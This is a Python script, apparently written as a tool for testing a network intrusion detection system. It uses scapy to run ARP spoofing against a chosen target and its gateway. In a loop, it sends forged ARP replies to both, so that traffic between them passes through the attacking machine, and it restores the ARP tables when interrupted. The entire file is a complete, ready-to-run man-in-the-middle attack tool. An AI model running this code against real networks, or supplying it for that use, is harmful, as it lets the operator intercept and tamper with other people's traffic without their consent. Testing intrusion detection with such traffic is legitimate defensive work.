import scapy.all as scapy
import time
import argparse
import sys

def get_mac(ip):
    """
    Sends an ARP Request to the given IP and returns its MAC address.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """
    Sends a forged ARP response to the target_ip, pretending to be the spoof_ip.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC address for {target_ip}. Make sure the host is up.")
        return False
        
    # op=2 means ARP Reply (is-at)
    # pdst=Target IP, hwdst=Target MAC
    # psrc=IP we are pretending to be (Gateway)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    return True

def restore(destination_ip, source_ip):
    """
    Restores the network back to its normal state by sending the real MAC addresses.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if not destination_mac or not source_mac:
        return
        
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # Send multiple times to ensure it's received
    scapy.send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool for testing NIDS.")
    parser.add_argument("-t", "--target", required=True, help="Target IP (e.g., 192.168.0.126)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway/Router IP (e.g., 192.168.0.1)")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway

    try:
        packets_sent_count = 0
        print(f"[*] Starting ARP spoofing... Target: {target_ip}, Gateway: {gateway_ip}")
        print("[*] Press Ctrl+C to stop and restore the network.")
        
        while True:
            # Tell the target that WE are the gateway
            success_target = spoof(target_ip, gateway_ip)
            # Tell the gateway that WE are the target
            success_gateway = spoof(gateway_ip, target_ip)
            
            if success_target and success_gateway:
                packets_sent_count += 2
                print(f"\r[+] Packets sent: {packets_sent_count}", end="")
                sys.stdout.flush()
                
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Detected Ctrl+C ... Restoring network ARP tables. Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()
